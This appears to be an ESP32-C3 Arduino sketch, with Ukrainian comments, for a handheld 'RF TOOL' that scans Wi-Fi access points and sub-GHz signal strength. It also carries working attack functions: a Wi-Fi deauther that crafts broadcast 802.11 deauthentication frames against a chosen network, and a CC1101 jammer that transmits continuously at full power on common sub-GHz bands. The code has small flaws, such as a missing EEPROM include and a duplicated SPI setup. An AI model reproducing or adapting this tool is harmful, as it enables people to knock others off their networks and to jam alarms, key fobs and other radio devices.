/*
 * RF TOOL v3.0 for ESP32-C3 Supermini
 * Features: Wi-Fi Deauther, Sub-GHz Scanner & Jammer (RadioLib)
 * Display: ST7735 0.96" (80x160)
 */

#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <RadioLib.h>
#include <WiFi.h>
#include <esp_wifi.h>

// ====================== Піни для ESP32-C3 Supermini ======================
#define TFT_CS      5
#define TFT_DC      6
#define TFT_RST     7
#define TFT_MOSI    10
#define TFT_SCLK    8
#define TFT_BL      9

#define CC1101_CS   4
#define BTN_UP      1
#define BTN_DOWN    2
#define BTN_SEL     3
#define BTN_BACK    0   // BOOT кнопка

Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);
CC1101 cc1101 = new Module(CC1101_CS, 255, 255, 255);

// ====================== Стани меню ======================
enum MenuState {
  MAIN_MENU,
  WIFI_MENU,
  SUBGHZ_SCAN,
  SUBGHZ_JAM,
  SETTINGS
};
MenuState currentState = MAIN_MENU;
int menuIndex = 0;
int subIndex = 0;
bool isRunning = false;

// Для CC1101 (RadioLib)
float freqs[] = {315.0, 433.92, 868.0, 915.0};
int freqIndex = 1;  // 433.92 за замовчуванням

// Для Wi-Fi
int apCount = 0;
int selectedAP = 0;
String apNames[20];
uint8_t apBSSID[20][6];
int apChannels[20];

// Налаштування
int brightness = 150;
bool settingsChanged = false;

// ====================== Прототипи ======================
void drawMainMenu();
void drawWiFiMenu();
void drawSubGHzScan();
void drawSubGHzJam();
void drawSettings();
void updateDisplay();
void checkButtons();
void scanWiFi();
void startDeauth(uint8_t* bssid, int channel);
void saveSettings();
void loadSettings();

// ====================== Setup ======================
void setup() {
  Serial.begin(115200);
  
  // Кнопки
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_SEL, INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);
  
  // Підсвітка
  pinMode(TFT_BL, OUTPUT);
  analogWrite(TFT_BL, brightness);
  
  // Дисплей
  SPI.begin(TFT_SCLK, -1, TFT_MOSI, TFT_CS);
  tft.initR(INITR_BLACKTAB);
  tft.setRotation(1);
  tft.fillScreen(ST77XX_BLACK);
  
  // CC1101 (RadioLib)
  SPI.begin(8, 11, 10, CC1101_CS);
  int state = cc1101.begin(freqs[freqIndex]);
  if (state == RADIOLIB_ERR_NONE) {
    Serial.println("CC1101 OK");
    cc1101.setOutputPower(12);  // максимальна потужність
  } else {
    Serial.print("CC1101 failed, code: ");
    Serial.println(state);
  }
  
  // Wi-Fi (для деаутера)
  WiFi.mode(WIFI_STA);
  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
  esp_wifi_set_ps(WIFI_PS_NONE);
  
  // Завантаження налаштувань
  loadSettings();
  
  drawMainMenu();
}

// ====================== Головний цикл ======================
void loop() {
  checkButtons();
  
  // Сканування Sub-GHz (RadioLib)
  if (currentState == SUBGHZ_SCAN && isRunning) {
    static unsigned long lastScan = 0;
    if (millis() - lastScan > 200) {
      lastScan = millis();
      float rssi = cc1101.getRSSI();
      tft.fillRect(0, 50, 80, 30, ST77XX_BLACK);
      tft.setCursor(5, 55);
      tft.print("RSSI: ");
      tft.print((int)rssi);
      tft.print(" dBm");
    }
  }
  
  // Джеммінг Sub-GHz (RadioLib)
  if (currentState == SUBGHZ_JAM && isRunning) {
    cc1101.transmitDirect();
  } else if (currentState == SUBGHZ_JAM && !isRunning) {
    cc1101.standby();
  }
  
  delay(20);
}

// ====================== Малювання меню ======================
void drawMainMenu() {
  tft.fillScreen(ST77XX_BLACK);
  tft.setTextSize(1);
  tft.setTextColor(ST77XX_GREEN);
  tft.setCursor(10, 5);
  tft.println("RF TOOL v3.0");
  tft.drawLine(0, 15, 80, 15, ST77XX_WHITE);
  
  const char* items[] = {"Wi-Fi Tools", "Sub-GHz Scan", "Sub-GHz Jam", "Settings"};
  for (int i = 0; i < 4; i++) {
    int y = 30 + i * 20;
    if (i == menuIndex) {
      tft.setTextColor(ST77XX_YELLOW);
      tft.setCursor(5, y);
      tft.print(">");
    } else {
      tft.setTextColor(ST77XX_WHITE);
    }
    tft.setCursor(15, y);
    tft.print(items[i]);
  }
  tft.setTextColor(ST77XX_CYAN);
  tft.setCursor(5, 150);
  tft.print("UP/DN SEL BACK");
}

void drawWiFiMenu() {
  tft.fillScreen(ST77XX_BLACK);
  tft.setTextColor(ST77XX_GREEN);
  tft.setCursor(10, 5);
  tft.print("Wi-Fi Tools");
  tft.drawLine(0, 15, 80, 15, ST77XX_WHITE);
  
  const char* items[] = {"Scan APs", "Start Deauth"};
  for (int i = 0; i < 2; i++) {
    int y = 30 + i * 20;
    if (i == subIndex) {
      tft.setTextColor(ST77XX_YELLOW);
      tft.setCursor(5, y);
      tft.print(">");
    } else {
      tft.setTextColor(ST77XX_WHITE);
    }
    tft.setCursor(15, y);
    tft.print(items[i]);
  }
}

void drawSubGHzScan() {
  tft.fillScreen(ST77XX_BLACK);
  tft.setTextColor(ST77XX_GREEN);
  tft.setCursor(10, 5);
  tft.print("Sub-GHz Scan");
  tft.drawLine(0, 15, 80, 15, ST77XX_WHITE);
  tft.setTextColor(ST77XX_WHITE);
  tft.setCursor(5, 35);
  tft.print("Freq: ");
  tft.print(freqs[freqIndex], 1);
  tft.println(" MHz");
  if (isRunning) {
    tft.setTextColor(ST77XX_GREEN);
    tft.setCursor(5, 55);
    tft.print("SCANNING...");
  } else {
    tft.setTextColor(ST77XX_YELLOW);
    tft.setCursor(5, 55);
    tft.print("Press SEL start");
  }
}

void drawSubGHzJam() {
  tft.fillScreen(ST77XX_BLACK);
  tft.setTextColor(ST77XX_GREEN);
  tft.setCursor(10, 5);
  tft.print("Sub-GHz Jammer");
  tft.drawLine(0, 15, 80, 15, ST77XX_WHITE);
  tft.setTextColor(ST77XX_WHITE);
  tft.setCursor(5, 35);
  tft.print("Freq: ");
  tft.print(freqs[freqIndex], 1);
  tft.println(" MHz");
  if (isRunning) {
    tft.setTextColor(ST77XX_RED);
    tft.setCursor(5, 55);
    tft.print("JAMMING!");
  } else {
    tft.setTextColor(ST77XX_YELLOW);
    tft.setCursor(5, 55);
    tft.print("Press SEL start");
  }
}

void drawSettings() {
  tft.fillScreen(ST77XX_BLACK);
  tft.setTextColor(ST77XX_GREEN);
  tft.setCursor(10, 5);
  tft.print("Settings");
  tft.drawLine(0, 15, 80, 15, ST77XX_WHITE);
  tft.setTextColor(ST77XX_WHITE);
  tft.setCursor(5, 35);
  tft.print("Brightness: ");
  tft.print(map(brightness, 0, 255, 0, 100));
  tft.print("%");
}

// ====================== Обробка кнопок ======================
void checkButtons() {
  static unsigned long lastPress = 0;
  if (millis() - lastPress < 200) return;
  
  if (digitalRead(BTN_UP) == LOW) {
    lastPress = millis();
    if (currentState == MAIN_MENU) {
      menuIndex = (menuIndex + 3) % 4;
      drawMainMenu();
    } else if (currentState == WIFI_MENU) {
      subIndex = (subIndex + 1) % 2;
      drawWiFiMenu();
    } else if (currentState == SUBGHZ_SCAN && !isRunning) {
      freqIndex = (freqIndex + 3) % 4;
      cc1101.setFrequency(freqs[freqIndex]);
      drawSubGHzScan();
    } else if (currentState == SUBGHZ_JAM && !isRunning) {
      freqIndex = (freqIndex + 3) % 4;
      cc1101.setFrequency(freqs[freqIndex]);
      drawSubGHzJam();
    } else if (currentState == SETTINGS) {
      brightness = constrain(brightness - 25, 0, 255);
      analogWrite(TFT_BL, brightness);
      settingsChanged = true;
      drawSettings();
    }
  }
  
  if (digitalRead(BTN_DOWN) == LOW) {
    lastPress = millis();
    if (currentState == MAIN_MENU) {
      menuIndex = (menuIndex + 1) % 4;
      drawMainMenu();
    } else if (currentState == WIFI_MENU) {
      subIndex = (subIndex + 1) % 2;
      drawWiFiMenu();
    } else if (currentState == SUBGHZ_SCAN && !isRunning) {
      freqIndex = (freqIndex + 1) % 4;
      cc1101.setFrequency(freqs[freqIndex]);
      drawSubGHzScan();
    } else if (currentState == SUBGHZ_JAM && !isRunning) {
      freqIndex = (freqIndex + 1) % 4;
      cc1101.setFrequency(freqs[freqIndex]);
      drawSubGHzJam();
    } else if (currentState == SETTINGS) {
      brightness = constrain(brightness + 25, 0, 255);
      analogWrite(TFT_BL, brightness);
      settingsChanged = true;
      drawSettings();
    }
  }
  
  if (digitalRead(BTN_SEL) == LOW) {
    lastPress = millis();
    if (currentState == MAIN_MENU) {
      switch (menuIndex) {
        case 0: currentState = WIFI_MENU; subIndex = 0; drawWiFiMenu(); break;
        case 1: currentState = SUBGHZ_SCAN; isRunning = false; drawSubGHzScan(); break;
        case 2: currentState = SUBGHZ_JAM; isRunning = false; drawSubGHzJam(); break;
        case 3: currentState = SETTINGS; drawSettings(); break;
      }
    }
    else if (currentState == WIFI_MENU) {
      if (subIndex == 0) {
        scanWiFi();
        if (apCount > 0) {
          selectedAP = 0;
          drawWiFiMenu();
        }
      } else if (subIndex == 1) {
        if (apCount > 0) {
          startDeauth(apBSSID[selectedAP], apChannels[selectedAP]);
        }
      }
    }
    else if (currentState == SUBGHZ_SCAN) {
      isRunning = !isRunning;
      drawSubGHzScan();
    }
    else if (currentState == SUBGHZ_JAM) {
      isRunning = !isRunning;
      drawSubGHzJam();
    }
  }
  
  if (digitalRead(BTN_BACK) == LOW) {
    lastPress = millis();
    if (currentState != MAIN_MENU) {
      currentState = MAIN_MENU;
      isRunning = false;
      cc1101.standby();
      drawMainMenu();
    } else if (settingsChanged) {
      saveSettings();
      settingsChanged = false;
    }
  }
}

// ====================== Wi-Fi функції ======================
void scanWiFi() {
  apCount = WiFi.scanNetworks();
  if (apCount > 20) apCount = 20;
  for (int i = 0; i < apCount; i++) {
    apNames[i] = WiFi.SSID(i);
    apChannels[i] = WiFi.channel(i);
    memcpy(apBSSID[i], WiFi.BSSID(i), 6);
  }
  WiFi.scanDelete();
  
  tft.fillScreen(ST77XX_BLACK);
  tft.setTextColor(ST77XX_GREEN);
  tft.setCursor(10, 5);
  tft.print("Found APs:");
  for (int i = 0; i < min(apCount, 4); i++) {
    tft.setCursor(5, 30 + i * 20);
    tft.print(apNames[i].substring(0, 12));
  }
  delay(1500);
}

void startDeauth(uint8_t* bssid, int channel) {
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    0x00, 0x00,
    0x01, 0x00
  };
  
  tft.fillScreen(ST77XX_BLACK);
  tft.setTextColor(ST77XX_RED);
  tft.setCursor(10, 30);
  tft.print("DEAUTH");
  tft.setCursor(10, 50);
  tft.print("ATTACK");
  tft.setCursor(10, 70);
  tft.print("ACTIVE");
  
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  for (int i = 0; i < 500; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    delay(10);
  }
  
  drawWiFiMenu();
}

// ====================== EEPROM ======================
void saveSettings() {
  EEPROM.begin(64);
  EEPROM.write(0, brightness);
  EEPROM.write(1, freqIndex);
  EEPROM.commit();
  EEPROM.end();
}

void loadSettings() {
  EEPROM.begin(64);
  brightness = EEPROM.read(0);
  if (brightness < 10 || brightness > 250) brightness = 150;
  freqIndex = EEPROM.read(1);
  if (freqIndex > 3) freqIndex = 1;
  EEPROM.end();
}